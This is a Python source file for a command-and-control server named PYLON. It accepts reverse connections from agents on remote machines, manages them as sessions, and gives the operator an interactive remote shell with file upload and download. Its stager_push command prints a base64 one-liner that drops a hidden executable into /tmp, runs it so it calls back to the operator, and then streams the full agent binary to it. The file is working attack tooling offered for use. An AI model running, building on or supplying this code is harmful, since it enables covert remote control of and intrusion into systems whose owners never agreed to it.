import base64
import os
import socket
import subprocess
import threading

from core.command_handler import CommandHandler
from core.plugins_engine import PluginsEngine

HOST = "0.0.0.0"
PORT = 9001
STAGER_PORT = 9002


class Engine:
    def __init__(self) -> None:
        self.sessions = {}
        self.session_lock = threading.Lock()
        self.session_counter = 1
        self.server_running = True
        self.command_handler = CommandHandler()
        self.pre_shell()

    def handle_agent(self, sid):
        with self.session_lock:
            if sid not in self.sessions or not self.sessions[sid]["active"]:
                print("Session not found")
                return
            conn = self.sessions[sid]["conn"]
            addr = self.sessions[sid]["addr"]

        print(f"Connection: {sid} ({addr})")
        print("Exit - close program")
        print("bg - disconnect agent, allow he to reconnect")
        print("upload <path>, download <path>")
        print("==== PYLON ====")

        plugins_engine = PluginsEngine(conn)
        plugins_engine.load_plugins()

        sc = False

        try:
            while True:
                cmd = input("pylon >")

                if not cmd:
                    continue

                if cmd in ["background", "bg", "detach"]:
                    print("Disconnecting agent")
                    break
                plugins_data = plugins_engine.execute_plugins(cmd)
                if plugins_data:
                    print(plugins_data)
                    continue

                self.command_handler.handle_command(cmd, conn)

        except Exception as e:
            print(f"Error-main-loop: {e}")
        finally:
            if sc:
                conn.close()

    def accept_thread_func(self, server_socket):
        while self.server_running:
            try:
                conn, addr = server_socket.accept()
                with self.session_lock:
                    sid = self.session_counter
                    self.session_counter += 1
                    self.sessions[sid] = {"conn": conn, "addr": addr, "active": True}
                print("\n\nNew session\n\npshell> ", end="")
            except Exception:
                break

    def list_sessions(self):
        print("\n" + "=" * 55)
        print(f"{'ID':<5} | {'IP':<18} | {'PORT':<8} | {'STATUS':<10}")
        print("-" * 55)
        with self.session_lock:
            if not self.sessions:
                print("No active self.sessions")
            for sid, data in self.sessions.items():
                if data["active"]:
                    ip, port = data["addr"]
                    print(f"{sid:<5} | {ip:<18} | {port:<8} | ACTIVE")
        print("=" * 55)

    def close_session(self, sid):
        with self.session_lock:
            if sid in self.sessions:
                try:
                    self.sessions[sid]["conn"].close()
                except Exception:
                    pass
                self.sessions[sid]["active"] = False

    def pre_shell(self):
        server_socket = None
        while True:
            cmd = input("pshell> ")
            if cmd.startswith("listen"):
                if server_socket is not None:
                    continue

                port = 9001
                if len(cmd.split()) < 2:
                    pass
                else:
                    _, port = cmd.split()

                PORT = int(port)

                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                server_socket.bind((HOST, PORT))
                server_socket.listen(10)
                t = threading.Thread(
                    target=self.accept_thread_func, args=(server_socket,), daemon=True
                )
                t.start()
            elif cmd in ["sessions -l", "sessions"]:
                self.list_sessions()
            elif cmd.startswith("session -i"):
                try:
                    sid = int(cmd.split()[2])
                    self.handle_agent(sid)
                except (IndexError, ValueError):
                    print("Usage: sessions -i <ID>")
            elif cmd.startswith("session -k"):
                try:
                    sid = int(cmd.split()[2])
                    self.close_session(sid)
                    print(f"Closed session [{sid}]")
                except (IndexError, ValueError):
                    print("Usage: sessions -k <ID>")
            elif cmd.startswith("stager_push"):
                try:
                    parts = cmd.split()
                    if len(parts) < 3:
                        print("Usage: stager_push [ip] [port]")
                        continue

                    s_ip, s_port = parts[1], parts[2]

                    stager_bin_path = "../build/stager"
                    agent_bin_path = "../build/agent_static"

                    if not os.path.exists(agent_bin_path):
                        subprocess.run(["make", "static"], cwd="..", check=False)

                    if not os.path.exists(stager_bin_path):
                        subprocess.run(["make", "stager"], cwd="..", check=False)

                    with open(stager_bin_path, "rb") as f:
                        stager_bytes = f.read()

                    with open(agent_bin_path, "rb") as f:
                        agent_bytes = f.read()

                    import gzip

                    compressed_data = gzip.compress(stager_bytes, compresslevel=9)

                    b64 = base64.b64encode(compressed_data).decode("utf-8")
                    print(
                        f"pusher>\necho {b64} | base64 -d | gunzip > /tmp/.st && chmod +x /tmp/.st && /tmp/.st {s_ip} {s_port}"
                    )

                    stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    stager_server.bind((HOST, STAGER_PORT))
                    stager_server.listen(1)

                    stager_conn, stager_addr = stager_server.accept()
                    print(f"CONNECTED: {stager_addr}")
                    stager_conn.sendall(agent_bytes)
                    stager_conn.close()
                    stager_server.close()
                except Exception as e:
                    print(f"ERROR: {e}")
                continue
            else:
                print("Invalid command: listen or stager_push")
